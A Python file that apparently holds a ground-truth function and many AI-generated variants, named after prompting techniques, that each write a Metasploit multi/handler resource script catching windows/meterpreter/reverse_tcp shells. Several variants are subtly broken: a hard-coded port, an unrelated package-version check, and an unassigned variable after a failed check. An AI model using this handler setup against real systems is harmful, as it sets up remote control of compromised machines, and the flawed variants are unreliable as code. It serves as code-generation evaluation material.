import re
import os
import ipaddress

def ground_truth_code_setupHandler(configFile, lhost, lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set payload ' + 'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')

def persona_setupHandler(configFile, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/multi/handler\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write(f'set LPORT {lport}\n')
        file.write(f'set LHOST {lhost}\n')
        file.write('exploit -j -z\n')
        file.write('setg DisablePayloadHandler 1\n')

def template_setupHandler(configFile, lhost, lport):
    try:
        if not isinstance(configFile, str) or not isinstance(lhost, str) or not isinstance(lport, int):
            raise ValueError('Invalid input types: configFile and lhost must be strings, lport must be an integer.')
        config_dir = os.path.dirname(configFile)
        if config_dir and not os.path.exists(config_dir):
            os.makedirs(config_dir)
        with open(configFile, 'w') as file:
            file.write('use exploit/multi/handler\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write(f'set LPORT {lport}\n')
            file.write(f'set LHOST {lhost}\n')
            file.write('exploit -j -z\n')
            file.write('setg DisablePayloadHandler 1\n')
    except (IOError, OSError) as e:
        print(f'File error: {str(e)}')
    except ValueError as ve:
        print(f'Value error: {str(ve)}')

def question_refinement_setupHandler(file_path, lhost, lport):
    lport = "4444"
    print(f"PORTA: {lport}")  # PORTA: 4444
    print(type(lport))         # <class 'str'>

    ip_pattern = re.compile(r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
    port_pattern = re.compile(r'^[0-9]{1,5}$')
    print(f"PORTA: {lport}")
    if not ip_pattern.match(lhost):
        return 'Invalid IP address format.'
    if not port_pattern.match(lport) or not (0 < int(lport) < 65536):
        return 'Invalid port number.'
    config_lines = [
        'use exploit/multi/handler',
        f'set payload windows/meterpreter/reverse_tcp',
        f'set LHOST {lhost}',
        f'set LPORT {lport}',
        'exploit -j -z'
    ]
    try:
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        with open(file_path, 'w', newline='') as config_file:
            config_file.write('\n'.join(config_lines) + '\n')
    except OSError as e:
        return f'File operation error: {e}'

def alternative_approaches_setupHandler(configFile, lhost, lport):
    import logging
    if not isinstance(configFile, str):
        logging.error('configFile must be a string.')
        raise ValueError('configFile must be a string.')
    if not isinstance(lhost, str):
        logging.error('lhost must be a string.')
        raise ValueError('lhost must be a string.')
    if not isinstance(lport, int):
        logging.error('lport must be an integer.')
        raise ValueError('lport must be an integer.')
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit/multi/handler\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write(f'set LPORT {lport}\n')
            file.write(f'set LHOST {lhost}\n')
            file.write('exploit -j -z\n')
            file.write('setg DisablePayloadHandler 1\n')
        logging.info(f'Configuration file {configFile} was created successfully.')
    except IOError as e:
        logging.error(f'File operation failed: {e}')
        raise
    except Exception as e:
        logging.error(f'An unexpected error occurred: {e}')
        raise

def context_manager_setupHandler(configFile, lhost, lport):
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit/multi/handler\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write('set LPORT ' + str(lport) + '\n')
            file.write('set LHOST ' + lhost + '\n')
            file.write('exploit -j -z\n')
            file.write('setg DisablePayloadHandler 1\n')
    except IOError as e:
        raise RuntimeError('Failed to write to the config file: ' + str(e))
    except Exception as e:
        raise RuntimeError('An unexpected error occurred: ' + str(e))

def flipped_interaction_3_setupHandler(configFile, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/multi/handler\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write(f'set LPORT {lport}\n')
        file.write(f'set LHOST {lhost}\n')
        file.write('exploit -j -z\n')
        file.write('setg DisablePayloadHandler 1\n')

def flipped_interaction_4_setupHandler(configFile, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/multi/handler\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write(f'set LPORT {lport}\n')
        file.write(f'set LHOST {lhost}\n')
        file.write('exploit -j -z\n')
        file.write('setg DisablePayloadHandler 1\n')

def flipped_interaction_5_setupHandler(configFile, lhost, lport):
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit/multi/handler\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write(f'set LPORT {str(lport)}\n')
            file.write(f'set LHOST {lhost}\n')
            file.write('exploit -j -z\n')
            file.write('setg DisablePayloadHandler 1\n')
    except IOError as e:
        print(f"An error occurred while writing the file: {e}")


def iterative_prompting_3_setup_handler(config_file, lhost, lport):
    if not isinstance(config_file, str):
        raise ValueError("config_file must be a string path.")
    if not isinstance(lhost, str):
        raise ValueError("lhost must be a string.")
    if not isinstance(lport, int):
        raise ValueError("lport must be an integer.")

    try:
        with open(config_file, "w", encoding="utf-8") as f:
            f.write("use exploit/multi/handler\n")
            f.write("set payload windows/meterpreter/reverse_tcp\n")
            f.write(f"set LPORT {lport}\n")
            f.write(f"set LHOST {lhost}\n")
            f.write("exploit -j -z\n")
            f.write("setg DisablePayloadHandler 1\n")
    except Exception as e:
        print(f"Error writing to config file: {e}")



def iterative_prompting_4_setup_handler(config_file, lhost, lport):
    if not isinstance(config_file, str) or not config_file:
        raise ValueError("config_file must be a non-empty string path.")
    if not isinstance(lhost, str) or not lhost:
        raise ValueError("lhost must be a non-empty string.")
    if not isinstance(lport, int) or not (0 < lport < 65536):
        raise ValueError("lport must be an integer between 1 and 65535.")

    try:
        with open(config_file, "w", encoding="utf-8") as f:
            f.write("use exploit/multi/handler\n")
            f.write("set payload windows/meterpreter/reverse_tcp\n")
            f.write(f"set LPORT {lport}\n")
            f.write(f"set LHOST {lhost}\n")
            f.write("exploit -j -z\n")
            f.write("setg DisablePayloadHandler 1\n")
    except OSError as e:
        print(f"File operation failed: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")


def iterative_prompting_5_setup_handler(config_file, lhost, lport):
    import ipaddress
    try:
        ipaddress.ip_address(lhost)
    except ValueError as e:
        raise ValueError(f'Invalid IP address: {lhost}') from e
    if not (1 <= lport <= 65535):
        raise ValueError('Port number must be between 1 and 65535')
    if not isinstance(config_file, str) or not config_file.strip():
        raise ValueError('Invalid configuration file name')
    try:
        with open(config_file, 'w') as file:
            file.write('use exploit/multi/handler\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write(f'set LPORT {lport}\n')
            file.write(f'set LHOST {lhost}\n')
            file.write('exploit -j -z\n')
            file.write('setg DisablePayloadHandler 1\n')
    except IOError as e:
        raise IOError(f'Error writing to file {config_file}: {e}')
    try:
        import pkg_resources
        outdated = [dist for dist in pkg_resources.working_set if pkg_resources.parse_version(dist.version) < pkg_resources.parse_version(pkg_resources.get_distribution(dist.project_name).version)]
        if outdated:
            raise RuntimeError('There are outdated packages in your environment that may need updating.')
    except ImportError:
        raise ImportError('The pkg_resources module is required to check for outdated packages')

def few_shots_prompting_setupHandler(configFile, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/multi/handler\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write('set LPORT ' + str(lport) + '\n')
        file.write('set LHOST ' + lhost + '\n')
        file.write('exploit -j -z\n')
        file.write('setg DisablePayloadHandler 1\n')

def cot_prompting_setupHandler(configFile, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/multi/handler\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write('set LPORT ' + str(lport) + '\n')
        file.write('set LHOST ' + lhost + '\n')
        file.write('exploit -j -z\n')
        file.write('setg DisablePayloadHandler 1\n')

def fact_check_list_setupHandler(configFile, lhost, lport):
    try:
        ipaddress.ip_address(lhost)
    except ValueError:
        raise ValueError(f"Invalid IP address: {lhost}")
    if not (0 <= lport <= 65535):
        raise ValueError(f"Invalid port number: {lport}. Must be in range 0-65535.")
    with open(configFile, "w") as file:
        file.write('use exploit/multi/handler\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write(f'set LPORT {str(lport)}\n')
        file.write(f'set LHOST {lhost}\n')
        file.write('exploit -j -z\n')
        file.write('setg DisablePayloadHandler 1\n')

def not_interactive_mix_setupHandler(configFile, lhost, lport):
    import os
    if not isinstance(configFile, str) or not configFile.endswith('.config'):
        print("configFile must be a string with a '.config' extension.")
    if not isinstance(lhost, str):
        print("lhost must be a valid IP address in string format.")
    try:
        octets = lhost.split('.');
        if len(octets) != 4 or not all(0 <= int(o) <= 255 for o in octets):
            print("lhost must be a valid IPv4 address.")
    except ValueError:
        print("lhost must be a valid IPv4 address.")
    try:
        int_lport = int(lport)
        if int_lport < 1 or int_lport > 65535:
            raise ValueError
    except (ValueError, TypeError):
        print("lport must be an integer between 1 and 65535.")
    try:
        with open(configFile, 'w') as f:
            f.write('use exploit/multi/handler\n')
            f.write('set payload windows/meterpreter/reverse_tcp\n')
            f.write(f'set LPORT {int_lport}\n')
            f.write(f'set LHOST {lhost}\n')
            f.write('exploit -j -z\n')
            f.write('setg DisablePayloadHandler 1\n')
    except IOError as e:
        raise IOError(f"Failed to write to {configFile}: {e}")

def interactive_mix_write_config_file(filepath, lhost, lport):
    def is_valid_ip(ip):
        try:
            parts = ip.split('.')
            return len(parts) == 4 and all(0 <= int(part) < 256 for part in parts)
        except ValueError:
            return False
    if not isinstance(lport, int) or not (0 <= lport <= 65535):
        raise ValueError('lport must be an integer between 0 and 65535.')
    if not is_valid_ip(lhost):
        raise ValueError('lhost must be a valid IPv4 address.')
    try:
        with open(filepath, 'w') as config_file:
            config_file.write('use exploit/multi/handler\n')
            config_file.write('set payload windows/meterpreter/reverse_tcp\n')
            config_file.write(f'set LPORT {lport}\n')
            config_file.write(f'set LHOST {lhost}\n')
            config_file.write('exploit -j -z\n')
            config_file.write('setg DisablePayloadHandler 1\n')
    except OSError as e:
        raise RuntimeError(f'Failed to write config file: {str(e)}')

def baseline_setupHandler(configFile, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/multi/handler\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write('set LPORT ' + str(lport) + '\n')
        file.write('set LHOST ' + lhost + '\n')
        file.write('exploit -j -z\n')
        file.write('setg DisablePayloadHandler 1\n')

